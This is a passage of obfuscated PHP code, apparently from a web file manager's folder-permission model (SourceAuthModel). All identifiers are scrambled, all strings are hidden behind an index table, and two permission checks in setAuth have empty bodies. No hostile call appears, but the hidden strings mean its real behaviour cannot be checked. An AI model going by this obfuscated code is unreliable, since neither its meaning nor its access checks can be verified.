$this->where($‰û›ë¯œ)->field($ö‘ôØ¾Ø[622])->select(); $‰ò½«íÒ = array_to_keyvalue($‰ò½«íÒ, $ö‘ôØ¾Ø[12], $ö‘ôØ¾Ø[622]); $¿Š“åşÜ = array_diff($‹¶Ì†ì‚, $‰ò½«íÒ); if (!empty($¿Š“åşÜ)) { foreach ($‹à¨Ø–í[$ö‘ôØ¾Ø[398]] as $‹ÔáŒñ => $ãªòÙÆè) { if (in_array($ãªòÙÆè[$ö‘ôØ¾Ø[622]], $¿Š“åşÜ)) { unset($‹à¨Ø–í[$ö‘ôØ¾Ø[398]][$‹ÔáŒñ]); } } } } $this->_listDataApply($‹à¨Ø–í[$ö‘ôØ¾Ø[398]]); return $‹à¨Ø–í; } public function reportStatus($í¿˜íß’) { $Ş’ßÑŒÛ =& $_SERVER[…É¦À–]; $Ö•«õóÏ = array($Ş’ßÑŒÛ[428] => $í¿˜íß’[$Ş’ßÑŒÛ[428]]); $—ş¦Àš³ = Model($Ş’ßÑŒÛ[2046])->where($Ö•«õóÏ)->field($Ş’ßÑŒÛ[2055])->find(); if (!$—ş¦Àš³) { return !1; } $Å”´“ù = array($Ş’ßÑŒÛ[790] => $í¿˜íß’[$Ş’ßÑŒÛ[790]]); if ($í¿˜íß’[$Ş’ßÑŒÛ[790]] == $Ş’ßÑŒÛ[2051] && $—ş¦Àš³[$Ş’ßÑŒÛ[790]] == $Ş’ßÑŒÛ[2051]) { $Å”´“ù[$Ş’ßÑŒÛ[790]] = 0; } $‘õŒ = Model($Ş’ßÑŒÛ[2046])->where($Ö•«õóÏ)->save($Å”´“ù); if ($í¿˜íß’[$Ş’ßÑŒÛ[790]] == $Ş’ßÑŒÛ[466]) { if ($—ş¦Àš³[$Ş’ßÑŒÛ[497]] != $Ş’ßÑŒÛ[198] && $this->shareFileMeta($—ş¦Àš³[$Ş’ßÑŒÛ[497]])) { $this->shareFileMeta($—ş¦Àš³[$Ş’ßÑŒÛ[497]], 0); } $this->remove($—ş¦Àš³[$Ş’ßÑŒÛ[622]]); return !0; } if ($‘õŒ && $í¿˜íß’[$Ş’ßÑŒÛ[790]] == $Ş’ßÑŒÛ[2051]) { $¼À‘É¨ = $Å”´“ù[$Ş’ßÑŒÛ[790]] == $Ş’ßÑŒÛ[2051] ? 1 : 0; $this->shareFileMeta($—ş¦Àš³[$Ş’ßÑŒÛ[497]], $¼À‘É¨); $this->removeByFile($—ş¦Àš³[$Ş’ßÑŒÛ[497]]); } return $‘õŒ; } private function removeByFile($Ë‡´Á°ï) { $ş¾û”öŠ =& $_SERVER[…É¦À–]; $íğê° = Model($ş¾û”öŠ[865])->where(array($ş¾û”öŠ[497] => $Ë‡´Á°ï))->field($ş¾û”öŠ[431])->select(); $™—ˆ˜ãÌ = array_to_keyvalue($íğê°, $ş¾û”öŠ[12], $ş¾û”öŠ[431]); $íãæ¤õû = array($ş¾û”öŠ[431] => array($ş¾û”öŠ[7], $™—ˆ˜ãÌ), $ş¾û”öŠ[517] => 1); $íğê° = $this->where($íãæ¤õû)->field($ş¾û”öŠ[622])->select(); if (empty($íğê°)) { return; } $Ãı¼»Çœ = array_to_keyvalue($íğê°, $ş¾û”öŠ[12], $ş¾û”öŠ[622]); $this->remove($Ãı¼»Çœ); } private function shareFileMeta($ªşìç´†, $ÓÔ‘¸èÀ = null) { $ÎàûØÅ =& $_SERVER[…É¦À–]; $“Û´„¡ = array($ÎàûØÅ[497] => $ªşìç´†, $ÎàûØÅ[94] => $ÎàûØÅ[2056]); if (is_null($ÓÔ‘¸èÀ)) { return Model($ÎàûØÅ[2057])->where($“Û´„¡)->find(); } $“Û´„¡[$ÎàûØÅ[403]] = $ÓÔ‘¸èÀ; Model($ÎàûØÅ[2057])->add($“Û´„¡, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\x65\137\141\165\x74\x68"; public function getAuth($Ô®«Ä­„) { $İÙë¢© =& $_SERVER[…É¦À–]; $ğˆ™ªÚ = $this->sourceAuthSelect($Ô®«Ä­„); $¤«–Ã¯ = array(); $—øÆ–«Û = array(); $¼ÄĞİÁ© = 2 << 25; foreach ($ğˆ™ªÚ as $¬Ç÷”µ›) { $ºƒÃù© = Model($İÙë¢©[527])->listData($¬Ç÷”µ›[$İÙë¢©[1981]]); if (!$ºƒÃù©) { continue; } $¤«–Ã¯[] = $¬Ç÷”µ›; $İÈ¢Ò¾ = 0; if ($¬Ç÷”µ›[$İÙë¢©[440]] == SourceModel::TYPE_GROUP) { $İÈ¢Ò¾ = $¼ÄĞİÁ© * 2; } if ($¬Ç÷”µ›[$İÙë¢©[440]] == SourceModel::TYPE_USER) { $İÈ¢Ò¾ = $¼ÄĞİÁ©; } if ($¬Ç÷”µ›[$İÙë¢©[440]] == SourceModel::TYPE_USER && $¬Ç÷”µ›[$İÙë¢©[525]] == $İÙë¢©[198]) { $İÈ¢Ò¾ = 0; } $—øÆ–«Û[] = $ºƒÃù©[$İÙë¢©[442]] + $İÈ¢Ò¾; } array_multisort($—øÆ–«Û, SORT_DESC, $¤«–Ã¯); return $¤«–Ã¯; } public function sourceAuthSelect($»¦Ö’îë) { $ì¨Òšëğ =& $_SERVER[…É¦À–]; static $„°ØËµ = array(); $ùÚÁƒÊò = is_array($»¦Ö’îë) ? !1 : !0; if ($ùÚÁƒÊò) { $»¦Ö’îë = array($»¦Ö’îë); } $À©øğğ† = array(); foreach ($»¦Ö’îë as $½ã«õÚæ) { if (isset($„°ØËµ[$½ã«õÚæ])) { $À©øğğ†[$½ã«õÚæ] = $„°ØËµ[$½ã«õÚæ]; } } if (count($À©øğğ†) == count($»¦Ö’îë)) { return $ùÚÁƒÊò ? $À©øğğ†[$»¦Ö’îë[0]] : $À©øğğ†; } $ŸØÓ«Òß = $ì¨Òšëğ[2058]; $ñó‹Ö¥¸ = array($ì¨Òšëğ[431] => array($ì¨Òšëğ[7], $»¦Ö’îë)); $Ì·–—½ = $this->field($ŸØÓ«Òß)->order($ì¨Òšëğ[428])->where($ñó‹Ö¥¸)->select(); $’©„ë†ş = array_to_keyvalue_group($Ì·–—½, $ì¨Òšëğ[431]); foreach ($»¦Ö’îë as $½ã«õÚæ) { $„°ØËµ[$½ã«õÚæ] = $’©„ë†ş[$½ã«õÚæ] ? $’©„ë†ş[$½ã«õÚæ] : array(); } if ($ùÚÁƒÊò) { return $Ì·–—½; } return $’©„ë†ş; } public function setAuth($†»öÉÚÄ, $á”÷½ÈÄ) { $º¤ËÓ÷¾ =& $_SERVER[…É¦À–]; $æçÁçù‚ = Model($º¤ËÓ÷¾[1378])->sourceInfo($†»öÉÚÄ); if (!$æçÁçù‚) { return !1; } if ($æçÁçù‚[$º¤ËÓ÷¾[440]] != SourceModel::TYPE_GROUP) { return !1; } $Ô²ñÍ© = 1; $´ñ•ó»¼ = $æçÁçù‚[$º¤ËÓ÷¾[525]]; if ($´ñ•ó»¼ != $Ô²ñÍ©) { $™´ô¼´¹ = array($º¤ËÓ÷¾[1877] => $´ñ•ó»¼); $ñ¨´§“¹ = Model($º¤ËÓ÷¾[1967])->field($º¤ËÓ÷¾[1687])->where($™´ô¼´¹)->select(); $ñ¨´§“¹ = array_to_keyvalue($ñ¨´§“¹, $º¤ËÓ÷¾[12], $º¤ËÓ÷¾[1687]); } $‰ö¿Ô¨œ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $§¦‘ÁÏä = array(); foreach ($á”÷½ÈÄ as $«îª­äò) { if (!in_array($«îª­äò[$º¤ËÓ÷¾[440]], $‰ö¿Ô¨œ)) { show_json(LNG($º¤ËÓ÷¾[2059]), !1); } if ($´ñ•ó»¼ != $Ô²ñÍ©) { if ($«îª­äò[$º¤ËÓ÷¾[440]] == SourceModel::TYPE_GROUP) { } if ($«îª­äò[$º¤ËÓ÷¾[525]] != 0 && !in_array($«îª­äò[$º¤ËÓ÷¾[525]], $ñ¨´§“¹)) { } } if ($«îª­äò[$º¤ËÓ÷¾[525]] == 0) { $«îª­äò[$º¤ËÓ÷¾[440]] = SourceModel::TYPE_USER; } $§¦‘ÁÏä[] = array($º¤ËÓ÷¾[431] => $†»öÉÚÄ, $º¤ËÓ÷¾[440] => intval($«îª­äò[$º¤ËÓ÷¾[440]]), $º¤ËÓ÷¾[525] => intval($«îª­äò[$º¤ËÓ÷¾[525]]), $º¤ËÓ÷¾[1981] => intval($«îª­äò[$º¤ËÓ÷¾[1981]]) ? intval($«îª­äò[$º¤ËÓ÷¾[1981]]) : 0, $º¤ËÓ÷¾[2041] => intval($«îª­äò[$º¤ËÓ÷¾[2041]]) ? intval($«îª­äò[$º¤ËÓ÷¾[2041]]) : -1); } $this->where(array($º¤ËÓ÷¾[446] => $†»öÉÚÄ))->delete(); $this->addAll($§¦‘ÁÏä); return !0; } public function authClear($×È¿Ç’ ) { $ÓÆ–± =& $_SERVER[…É¦À–]; $áæÓ¾ø¿ = Model($ÓÆ–±[1378])->sourceInfo($×È¿Ç’ ); $å¹åëã› = array($×È¿Ç’ ); if ($áæÓ¾ø¿[$ÓÆ–±[439]] == $ÓÆ–±[88]) { $àÂ®ÖœŠ = array($ÓÆ–±[609] => array($ÓÆ–±[569], $áæÓ¾ø¿[$ÓÆ–±[540]] . $×È¿Ç’  . $ÓÆ–±[570])); $å¹åëã› = Model($ÓÆ–±[1378])->field($ÓÆ–±[446])->where($àÂ®ÖœŠ)->getField($ÓÆ–±[431], !0); $å¹åëã›[] = $×È¿Ç’ ; } $this->where(array($ÓÆ–±[446] => array($ÓÆ–±[447], $å¹åëã›)))->delete(); return !0; } public function getAllChildren($çñ„™ß) { $ƒ“’…êÄ =& $_SERVER[…É¦À–]; $†ûÊâÖ = Model($ƒ“’…êÄ[1378])->sourceInfo($çñ„™ß); if ($†ûÊâÖ[$ƒ“’…êÄ[439]] != $ƒ“’…êÄ[88]) { return $this->sourceListAuth(array($çñ„™ß)); } if ($†ûÊâÖ[$ƒ“’…êÄ[440]] != SourceModel::TYPE_GROUP) { return array(); } $ä‘ñ¥Ü† = 1; $ØïàûªÑ = array($çñ„™ß); if ($†ûÊâÖ[$ƒ“’…êÄ[461]] == $ƒ“’…êÄ[198] && $†ûÊâÖ[$ƒ“’…êÄ[525]] != $ä‘ñ¥Ü†) { $ØïàûªÑ = $this->groupChidldAllRootSource($†ûÊâÖ[$ƒ“’…êÄ[525]]); } $ø…ãğôğ = $this->field($ƒ“’…êÄ[431])->group($ƒ“’…êÄ[431])->select(); $ø…ãğôğ = array_to_keyvalue($ø…ãğôğ, $ƒ“’…êÄ[12], $ƒ“’…êÄ[431]); if (!$ø…ãğôğ) { return array(); } $ÕÚ¦‘¤ª = $ƒ“’…êÄ[2060]; $ÀÉ ¼ò¤ = array($ƒ“’…êÄ[431] => array($ƒ“’…êÄ[7], $ø…ãğôğ), $ƒ“’…êÄ[460] => $ƒ“’…êÄ[198]); $Ê¹‡´ï = Model($ƒ“’…êÄ[865])->field($ÕÚ¦‘¤ª)->where($ÀÉ ¼ò¤)->select(); $–øâ¢–É = array($çñ„™ß); foreach ($Ê¹‡´ï as $À¤ó¿·) { foreach ($ØïàûªÑ as $¶ò‰§Áã) { $ˆ¬Š£ğ = $ƒ“’…êÄ[50] . $¶ò‰§Áã . $ƒ“’…êÄ[50]; $ƒçú¨Ô‘ = $À¤ó¿·[$ƒ“’…êÄ[540]] . $À¤ó¿·[$ƒ“’…êÄ[431]] . $ƒ“’…êÄ[50]; if (strstr($ƒçú¨Ô‘, $ˆ¬Š£ğ)) { $–øâ¢–É[] = $À¤ó¿·[$ƒ“’…êÄ[431]]; break; } } } return $this->sourceListAuth($–øâ¢–É); } private function sourceListAuth($¹…”Øò“) { $ÜÍ´ıâ =& $_SERVER[…É¦À–]; $¤™Û© = Model($ÜÍ´ıâ[1378])->sourceListInfo($¹…”Øò“, !0); $ã¡ÊòÏ = $this->sourceAuthSelect($¹…”Øò“); $ŞŒ§ú = array(); $½Í©º¦ = array(); foreach ($¤™Û© as $³å½”À¨) { unset($³å½”À¨[$ÜÍ´ıâ[485]]); unset($³å½”À¨[$ÜÍ´ıâ[483]]); unset($³å½”À¨[$ÜÍ´ıâ[442]]); unset($³å½”À¨[$ÜÍ´ıâ[87]]); $Àæş†àÍ = $ã¡ÊòÏ[$³å½”À¨[$ÜÍ´ıâ[431]]]; if (!$Àæş†àÍ) { continue; } $³å½”À¨[$ÜÍ´ıâ[2061]] = $this->authTargetInfo($Àæş†àÍ); $³å½”À¨[$ÜÍ´ıâ[538]] = rtrim($³å½”À¨[$ÜÍ´ıâ[544]], $ÜÍ´ıâ[8]) . $ÜÍ´ıâ[8] . ltrim($³å½”À¨[$ÜÍ´ıâ[538]], $ÜÍ´ıâ[8]); $ŞŒ§ú[] = $³å½”À¨; $ô¾µÚ’„ = count(explode($ÜÍ´ıâ[8], trim($³å½”À¨[$ÜÍ´ıâ[538]], $ÜÍ´ıâ[8]))); $½Í©º¦[] = $ô¾µÚ’„ + ($³å½”À¨[$ÜÍ´ıâ[33]] == $ÜÍ´ıâ[75] ? 0 : 1000); } array_multisort($½Í©º¦, SORT_ASC, $ŞŒ§ú); return $ŞŒ§ú; } private function groupChidldAllRootSource($ØüåÏÊ) { $îßôşÌ± =& $_SERVER[…É¦À–]; $¨ØÜ¾°ƒ = Model($îßôşÌ±[2062])->groupChildrenAll($ØüåÏÊ); $½‰ûœ» = array($îßôşÌ±[461] => 0, $îßôşÌ±[525] => array($îßôşÌ±[7], $¨ØÜ¾°ƒ), $îßôşÌ±[440] => SourceModel::TYPE_GROUP); $‹ˆåÙØ‘ = Model($îßôşÌ±[865])->field($îßôşÌ±[431])->where($½‰ûœ»)->select(); $‹ˆåÙØ‘ = array_to_keyvalue($‹ˆåÙØ‘, $îßôşÌ±[12], $îßôşÌ±[431]); return $‹ˆåÙØ‘; } private function authTargetInfo($òš¾«ÀŒ) { $ìËğ½µğ =& $_SERVER[…É¦À–]; $‡õ©–è´ = array(); $ıûÜğÃå = array(); $¡ ş‹¤î = 2 << 25; foreach ($òš¾«ÀŒ as $ÀíŸ¬Ş) { $Õ›»ÙÜ¤ = Model($ìËğ½µğ[527])->listData($ÀíŸ¬Ş[$ìËğ½µğ[1981]]); if (!$Õ›»ÙÜ¤) { continue; } if ($ÀíŸ¬Ş[$ìËğ½µğ[440]] == SourceModel::TYPE_USER) { $Éî¦ªÜÔ = Model($ìËğ½µğ[533])->getInfoSimpleOuter($ÀíŸ¬Ş[$ìËğ½µğ[525]]); if ($Éî¦ªÜÔ[$ìËğ½µğ[1687]] == $ìËğ½µğ[1233]) { continue; } if ($Éî¦ªÜÔ[$ìËğ½µğ[1687]] == $ìËğ½µğ[198]) { $Éî¦ªÜÔ[$ìËğ½µğ[32]] = LNG($ìËğ½µğ[2063]); } } else { $Éî¦ªÜÔ = Model($ìËğ½µğ[541])->getInfoSimple($ÀíŸ¬Ş[$ìËğ½µğ[525]]); } if (!$Éî¦ªÜÔ) { continue; } $Éî¦ªÜÔ[$ìËğ½µğ[496]] = $Õ›»ÙÜ¤; $‡õ©–è´[] = $Éî¦ªÜÔ; $„¡³Šˆï = 0; if ($ÀíŸ¬Ş[$ìËğ½µğ[440]] == SourceModel::TYPE_GROUP) { $„¡³Šˆï = $¡ ş‹¤î * 2; } if ($ÀíŸ¬Ş[$ìËğ½µğ[440]] == SourceModel::TYPE_USER) { $„¡³Šˆï = $¡ ş‹¤î; } if ($ÀíŸ¬Ş[$ìËğ½µğ[440]] == SourceModel::TYPE_USER && $ÀíŸ¬Ş[$ìËğ½µğ[525]] == $ìËğ½µğ[198]) { $„¡³Šˆï = 0; } $ıûÜğÃå[] = $Õ›»ÙÜ¤[$ìËğ½µğ[442]] + $„¡³Šˆï; } array_multisort($ıûÜğÃå, SORT_DESC, $‡õ©–è´); return $‡õ©–è´; } public function getAllChildrenByUser($“Íì¾Øã, $ˆ½Ş³°¿) { $³Á¥œç =& $_SERVER[…É¦À–]; $àşÅ„…Û = Model($³Á¥œç[554])->getInfo($ˆ½Ş³°¿); if (!$ˆ½Ş³°¿ || !$“Íì¾Øã || !$àşÅ„…Û) { return array(); } $Ùµ‹§Ñ = Model($³Á¥œç[1378])->sourceInfo($“Íì¾Øã); $€ôîò¨› = array(); $±Ÿ¡€–² = 1; if ($Ùµ‹§Ñ[$³Á¥œç[461]] == $³Á¥œç[198] && $Ùµ‹§Ñ[$³Á¥œç[525]] != $±Ÿ¡€–² && $this->groupContainUser($Ùµ‹§Ñ[$³Á¥œç[525]], $ˆ½Ş³°¿)) { foreach ($àşÅ„…Û[$³Á¥œç[2064]] as $Šê°Äññ) { $ÇşíÉ™ò = Model($³Á¥œç[541])->getInfo($Šê°Äññ[$³Á¥œç[1877]]); $ÒçÄÙ®İ = Model($³Á¥œç[554])->getInfoSimpleOuter($ˆ½Ş³°¿); $ÒçÄÙ®İ[$³Á¥œç[496]] = $Šê°Äññ[$³Á¥œç[442]]; if (Model($³Á¥œç[527])->authCheckAction($Šê°Äññ[$³Á¥œç[442]][$³Á¥œç[442]], $³Á¥œç[1898])) { continue; } $´´ú»Üæ = array($³Á¥œç[32] => $³Á¥œç[1253] . $ÇşíÉ™ò[$³Á¥œç[32]], $³Á¥œç[431] => $ÇşíÉ™ò[$³Á¥œç[87]][$³Á¥œç[431]], $³Á¥œç[84] => KodIO::make($ÇşíÉ™ò[$³Á¥œç[87]][$³Á¥œç[431]]), $³Á¥œç[461] => $³Á¥œç[198], $³Á¥œç[440] => $³Á¥œç[534], $³Á¥œç[33] => $³Á¥œç[573], $³Á¥œç[538] => $ÇşíÉ™ò[$³Á¥œç[545]], $³Á¥œç[1877] => $ÇşíÉ™ò[$³Á¥œç[1877]], $³Á¥œç[542] => $ÇşíÉ™ò[$³Á¥œç[461]], $³Á¥œç[2061] => array($ÒçÄÙ®İ)); $€ôîò¨›[$´´ú»Üæ[$³Á¥œç[431]]] = $´´ú»Üæ; } } $âé¿±¿æ = array(); $ì±¾óÎ£ = $this->getAllChildren($“Íì¾Øã); foreach ($ì±¾óÎ£ as $İ¼ÈİÁø) { $Ãİæ»¯Õ = !1; foreach ($İ¼ÈİÁø[$³Á¥œç[2061]] as $ò³ƒÀ†Ì) { if ($ò³ƒÀ†Ì[$³Á¥œç[1687]]) { if ($ò³ƒÀ†Ì[$³Á¥œç[1687]] == $ˆ½Ş³°¿) { $Ãİæ»¯Õ = !0; break; } } if ($ò³ƒÀ†Ì[$³Á¥œç[1877]]) { if ($this->groupContainUser($ò³ƒÀ†Ì[$³Á¥œç[1877]], $ˆ½Ş³°¿)) { $Ãİæ»¯Õ = !0; break; } } } if ($Ãİæ»¯Õ) { $âé¿±¿æ[] = $İ¼ÈİÁø; } $òÆäÕõô = $İ¼ÈİÁø[$³Á¥œç[431]]; if (isset($€ôîò¨›[$òÆäÕõô])) { $İ¼ÈİÁø[$³Á¥œç[2061]][] = $€ôîò¨›[$òÆäÕõô][0]; $€ôîò¨›[$òÆäÕõô] = !1; } } $€ôîò¨› = array_filter(array_values($€ôîò¨›)); $âé¿±¿æ = array_merge($€ôîò¨›, $âé¿±¿æ); return $âé¿±¿æ; } public function setAllChildrenByUser($çïæı¢á, $®¿½²ı¸, $°¡±è ™) { $…Â›¤ÇÃ =& $_SERVER[…É¦À–]; $Äğ©ÕçÚ = $this->getAllChildrenByUser($çïæı¢á, $®¿½²ı¸); if (!$°¡±è ™ || !$Äğ©ÕçÚ) { return !1; } foreach ($Äğ©ÕçÚ as $âŸ¢¸ì) { $ôÌÍóğú = array(); foreach ($âŸ¢¸ì[$…Â›¤ÇÃ[2061]] as $ØĞâ²‘) { $à·ÂÃ¦ = $ØĞâ²‘[$…Â›¤ÇÃ[496]]; $—ÚØ´²Ô = $ØĞâ²‘[$…Â›¤ÇÃ[1687]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‹ÙÂ°Ç¿ = $ØĞâ²‘[$…Â›¤ÇÃ[1687]] ? $ØĞâ²‘[$…Â›¤ÇÃ[1687]] : $ØĞâ²‘[$…Â›¤ÇÃ[1877]]; if ($ØĞâ²‘[$…Â›¤ÇÃ[1687]] && $ØĞâ²‘[$…Â›¤ÇÃ[1687]] == $®¿½²ı¸) { continue; } $ôÌÍóğú[] = array($…Â›¤ÇÃ[431] => $âŸ¢¸ì[$…Â›¤ÇÃ[431]], $…Â›¤ÇÃ[440] => $—ÚØ´²Ô, $…Â›¤ÇÃ[525] => intval($‹ÙÂ°Ç¿), $…Â›¤ÇÃ[1981] => isset($à·ÂÃ¦[$…Â›¤ÇÃ[428]]) ? intval($à·ÂÃ¦[$…Â›¤ÇÃ[428]]) : 0, $…Â›¤ÇÃ[2041] => isset($à·ÂÃ¦[$…Â›¤ÇÃ[2041]]) ? intval($à·ÂÃ¦[$…Â›¤ÇÃ[2041]]) : -1); } $ôÌÍóğú[] = array($…Â›¤ÇÃ[431] => $âŸ¢¸ì[$…Â›¤ÇÃ[431]], $…Â›¤ÇÃ[440] => SourceModel::TYPE_USER, $…Â›¤ÇÃ[525] => intval($®¿½²ı¸), $…Â›¤ÇÃ[1981] => intval($°¡±è ™), $…Â›¤ÇÃ[2041] => -1); $this->where(array($…Â›¤ÇÃ[446] => $âŸ¢¸ì[$…Â›¤ÇÃ[431]]))->delete(); $this->addAll($ôÌÍóğú); } return !0; } public function get($ô»ø¼¦) { $€ó¾Ò = $this->getSourceList(array($ô»ø¼¦), !0); return $€ó¾Ò[0]; } public function getSourceList($èäÔİ¡˜, $Úš ÖãÒ = false, $Ë¼ø›’½ = false) { $«¨÷¯Ææ =& $_SERVER[…É¦À–]; if (!$èäÔİ¡˜) { return array(); } $îğÔÄè = Model($«¨÷¯Ææ[1378]); if (!$Úš ÖãÒ && count($èäÔİ¡˜) == 1) { $Úš ÖãÒ = array(); $Úš ÖãÒ[$èäÔİ¡˜[0]] = $îğÔÄè->sourceInfo($èäÔİ¡˜[0]); } if (!$Úš ÖãÒ) { $ØÓ¨Æ· = array($«¨÷¯Ææ[446] => array($«¨÷¯Ææ[447], $èäÔİ¡˜)); $Úš ÖãÒ = $îğÔÄè->field($«¨÷¯Ææ[2065])->where($ØÓ¨Æ·)->select(); $Úš ÖãÒ = array_to_keyvalue($Úš ÖãÒ, $«¨÷¯Ææ[431]); } $ğÖÙĞ’ = $èäÔİ¡˜; foreach ($Úš ÖãÒ as $Ñ„æĞò => $©ìãÖµ ) { $óıú¬àè = $îğÔÄè->parentLevelArray($©ìãÖµ [$«¨÷¯Ææ[540]]); $ğÖÙĞ’ = array_merge($ğÖÙĞ’, array($Ñ„æĞò), array_reverse($óıú¬àè)); } $ğÖÙĞ’ = array_values(array_unique($ğÖÙĞ’)); if (!$ğÖÙĞ’) { return array(); } $ê¬Ü±§õ = $this->sourceAuthSelect($ğÖÙĞ’); $­Òû‚¢Ç = array(); foreach ($ğÖÙĞ’ as $½»®™­ğ) { if (isset($ê¬Ü±§õ[$½»®™­ğ])) { $­Òû‚¢Ç[$½»®™­ğ] = $ê¬Ü±§õ[$½»®™­ğ]; } } $œÃ¯Ü = $this->userIsRoot($Ë¼ø›’½); $Ğ Üê¬ó = AuthModel::authAll(); $éÍóÜ¹ = array($«¨÷¯Ææ[443] => $Ğ Üê¬ó, $«¨÷¯Ææ[2066] => array($«¨÷¯Ææ[448] => 0, $«¨÷¯Ææ[1883] => $Ğ Üê¬ó, $«¨÷¯Ææ[449] => LNG($«¨÷¯Ææ[2067]), $«¨÷¯Ææ[1900] => $«¨÷¯Ææ[2068])); $ª×‡¦ø = array(); foreach ($Úš ÖãÒ as $½»®™­ğ => $í©İ…“Í) { if ($œÃ¯Ü && $GLOBALS[$«¨÷¯Ææ[6]][$«¨÷¯Ææ[1896]]) { $ª×‡¦ø[$½»®™­ğ] = $éÍóÜ¹; continue; } $ª×‡¦ø[$½»®™­ğ] = $this->makeSourceAuth($í©İ…“Í, $­Òû‚¢Ç, $Ë¼ø›’½); } return $ª×‡¦ø; } public function authDeepCheck($¬–·ºı˜, $‚ºÊÆİÑ = false) { $œÙÈ¶ƒ‡ =& $_SERVER[…É¦À–]; $‚ºÊÆİÑ = $‚ºÊÆİÑ ? $‚ºÊÆİÑ : USER_ID; $ÉøŠ‚ò• = $this->makeAuthDeep($‚ºÊÆİÑ); if (!in_array($¬–·ºı˜, $ÉøŠ‚ò•[$œÙÈ¶ƒ‡[2069]])) { return !1; } $Ì¬œÅ—û = array(); foreach ($ÉøŠ‚ò•[$œÙÈ¶ƒ‡[2070]] as $†ŸÒ ƒ => $Ÿ§å¤³ú) { if (!in_array($¬–·ºı˜, $Ÿ§å¤³ú)) { continue; } $Ì¬œÅ—û[] = $†ŸÒ ƒ; } if (!$Ì¬œÅ—û) { return !1; } $·æ´Ô½ = $Ì¬œÅ—û ? $Ì¬œÅ—û[0] : $¬–·ºı˜; return array($œÙÈ¶ƒ‡[443] => -1, $œÙÈ¶ƒ‡[496] => array($œÙÈ¶ƒ‡[448] => $œÙÈ¶ƒ‡[1233], $œÙÈ¶ƒ‡[1883] => $œÙÈ¶ƒ‡[198], $œÙÈ¶ƒ‡[449] => LNG($œÙÈ¶ƒ‡[2071]), $œÙÈ¶ƒ‡[1900] => $œÙÈ¶ƒ‡[2072]), $œÙÈ¶ƒ‡[2073] => LNG($œÙÈ¶ƒ‡[2074]), $œÙÈ¶ƒ‡[2075] => $this->sourceAuthInfo($·æ´Ô½)); } protected function makeAuthDeep($úª›èíÎ = false) { $×‡ùÙç =& $_SERVER[…É¦À–]; static $õ„¾™áš = array(); $úª›èíÎ = $úª›èíÎ ? $úª›èíÎ : USER_ID; if (isset($õ„¾™áš[$úª›èíÎ])) { return $õ„¾™áš[$úª›èíÎ]; } $Ï ÊƒïÎ = Model($×‡ùÙç[2076])->listData(); $ØÇ¨Áí = array(); foreach ($Ï ÊƒïÎ as $ÀùàèÏà) { if ($ÀùàèÏà[$×‡ùÙç[442]] == 0 && $ÀùàèÏà[$×‡ùÙç[1899]] == $×‡ùÙç[88]) { $ØÇ¨Áí[] = $ÀùàèÏà[$×‡ùÙç[428]]; } } $›´ Å± = $this->userGroupParents($úª›èíÎ); $©´½™Ö¡ = array($×‡ùÙç[440] => SourceModel::TYPE_USER, $×‡ùÙç[525] => $úª›èíÎ); if ($›´ Å±) { $©´½™Ö¡ = array(array($×‡ùÙç[440] => SourceModel::TYPE_USER, $×‡ùÙç[525] => $úª›èíÎ), array($×‡ùÙç[440] => SourceModel::TYPE_GROUP, $×‡ùÙç[525] => array($×‡ùÙç[447], $›´ Å±)), $×‡ùÙç[1045] => $×‡ùÙç[1975]); } $Ï°ˆ€ó = $this->field($×‡ùÙç[2077])->where($©´½™Ö¡)->select(); $¢¹şÎ® = array(); $ùğ‹• = array_to_keyvalue_group($Ï°ˆ€ó, $×‡ùÙç[431]); foreach ($ùğ‹• as $„İµ¿ßÖ => $€À¥€Îø) { $¼€³ûâ€ = $this->authArrayCheck($€À¥€Îø, $úª›èíÎ); if ($¼€³ûâ€[$×‡ùÙç[443]] > 0) { $¢¹şÎ®[] = $„İµ¿ßÖ . $×‡ùÙç[12]; } } if ($›´ Å±) { $í‡––îÏ = Model($×‡ùÙç[541]); foreach ($›´ Å± as $ÌÑ„Ä˜) { $¢£–®àó = $í‡––îÏ->getInfo($ÌÑ„Ä˜); if (!$¢£–®àó || !is_array($¢£–®àó[$×‡ùÙç[87]])) { continue; } $¢¹şÎ®[] = $¢£–®àó[$×‡ùÙç[87]][$×‡ùÙç[431]]; } } $ôöèØê© = array(); $Ü¯±ãÕù = $›´ Å±; $À¸ééà’ = Model($×‡ùÙç[1378]); $í‡––îÏ = Model($×‡ùÙç[541]); $åÓûÆÓœ = array(); $²íÓ¯ = array(); $Î…ıü»‚ = array(); $¶û²Ù”É = array(); if ($¢¹şÎ®) { $æ˜Ò…Í× = $À¸ééà’->where(array($×‡ùÙç[431] => array($×‡ùÙç[447], $¢¹şÎ®)))->select(); foreach ($æ˜Ò…Í× as $ö—Œ¤‡Â) { $“Èß•Õ€ = $À¸ééà’->parentLevelArray($ö—Œ¤‡Â[$×‡ùÙç[540]]); $ôöèØê© = array_merge($ôöèØê©, $“Èß•Õ€); $Ü¯±ãÕù[] = $ö—Œ¤‡Â[$×‡ùÙç[525]]; $åÓûÆÓœ[$ö—Œ¤‡Â[$×‡ùÙç[431]]] = $“Èß•Õ€; $²íÓ¯[$ö—Œ¤‡Â[$×‡ùÙç[431]]] = $ö—Œ¤‡Â[$×‡ùÙç[525]]; } } $Ü¯±ãÕù = array_values(array_unique($Ü¯±ãÕù)); $¦‘ˆîó¶ = $Ü¯±ãÕù; foreach ($¦‘ˆîó¶ as $ÌÑ„Ä˜) { $¢£–®àó = $í‡––îÏ->getInfo($ÌÑ„Ä˜); $“Èß•Õ€ = $À¸ééà’->parentLevelArray($¢£–®àó[$×‡ùÙç[540]]); $Ü¯±ãÕù = array_merge($Ü¯±ãÕù, $“Èß•Õ€); } $Ü¯±ãÕù = array_values(array_unique($Ü¯±ãÕù)); foreach ($Ü¯±ãÕù as $ÌÑ„Ä˜) { $¢£–®àó = $í‡––îÏ->getInfo($ÌÑ„Ä˜); $ôöèØê©[] = $¢£–®àó[$×‡ùÙç[87]][$×‡ùÙç[431]]; $Î…ıü»‚[$ÌÑ„Ä˜] = $¢£–®àó[$×‡ùÙç[87]][$×‡ùÙç[431]]; $¶û²Ù”É[$ÌÑ„Ä˜] = $À¸ééà’->parentLevelArray($¢£–®àó[$×‡ùÙç[540]]); } foreach ($åÓûÆÓœ as $Î”Éïúù => $±‹ª¡ÃÁ) { $ß¶Š£‹Œ = $²íÓ¯[$Î”Éïúù]; if (!$ß¶Š£‹Œ || 